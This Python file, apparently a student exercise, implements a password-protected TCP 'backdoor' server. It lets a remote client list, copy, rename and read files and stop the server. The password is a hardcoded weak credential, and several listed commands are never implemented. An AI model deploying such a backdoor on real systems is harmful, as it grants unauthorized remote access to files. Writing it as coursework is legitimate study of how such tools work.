import socketserver
import socket
import sys, os, shutil
class MyTCPHandler(socketserver.BaseRequestHandler):
# wassap test comment    
   
   BUFFER_SIZE = 4096
   def handle(self):
       commands = ["pwd", "cd <dir>", "ls", "cp <file1> <file2>", "mv <file1> <file2>", "rm <file>", "cat <file>", "snap", "diff", "help [cmd]", "logout", "off"]
       descriptions = ["return the current working directory", "change the current working directory to <dir>", "list the contents of the current working directory", "copy file1 to file2", "rename file1 to file2", "delete file"]
       password = "cpsc"
       intro = self.request.sendall(bytearray("Identify yourself!\n", "utf-8"))
       
       passed = False;

       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")

           if (passed == False):      # compare user entered password and the actual password
               if (data.split(None, 2)[0] == password):                           
                   self.request.sendall(bytearray("welcome boss\n", "utf-8"))
                   passed = True
                   continue
               else:
                    self.request.sendall(bytearray("bad password\n", "utf-8"))
                          
           # start commands here
           if passed == True:
               # pwd
               if data.strip() == "pwd":
                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8")) 
                   continue
               # cd <dir>
               if data.split(None, 1)[0] == "cd":
                   try:
                      self.request.sendall(bytearray("going to " + data.split(None,2)[1] + "\n", "utf-8"))
                      os.chdir(data.split(None, 2)[1])
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               # ls
               if data.strip() == "ls":
                  for files in os.listdir(os.getcwd()):
                      self.request.sendall(bytearray(files + "\n", "utf-8"))
                  continue
               # cp <file1> <file2>
               if data.split(None, 1)[0] == "cp":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                       shutil.copyfile(file1, file2)
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               # mv <file1> <file2>
               if data.split(None, 1)[0] == "mv":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                      os.rename(file1, file2) 
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue

                # help [cmd]
               if data.split(None, 1)[0] == "help":
                  for cmd in commands:
                    self.request.sendall(bytearray(cmd + "\n", "utf-8"))
                  continue



                # cat <file>
               if data.split(None, 1)[0] == "cat":
                  catfile = data.split(None, 2)[1]
                  a = open(catfile)
                  contents = a.read()
                  self.request.sendall(bytearray(contents, "utf-8"))
                  continue

                # off
               if data.split(None, 1)[0] == "off":
                  print("Terminating myself...")
                  self.request.sendall(bytearray("Terminating myself...So long\n", "utf-8"))
                  os._exit(1)                                                       #exit without ptinting traceback
                
                

                  
               ######                     #####
               #                              #
               #    ADD MORE COMMANDS HERE!   #
               #                              #
               ######                     #####
               # end of all commands, everything else don't understand
               else:
                   self.request.sendall(bytearray("Sorry don't understand your request\n", "utf-8"))
           
           
           
           #self.request.sendall( bytearray( "You said: " + data, "utf-8"))
           

if __name__ == "__main__":
   HOST, PORT = "localhost", int(sys.argv[1])
   server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
   print("backdoor listening on port ", PORT)
   server.serve_forever()
  
   
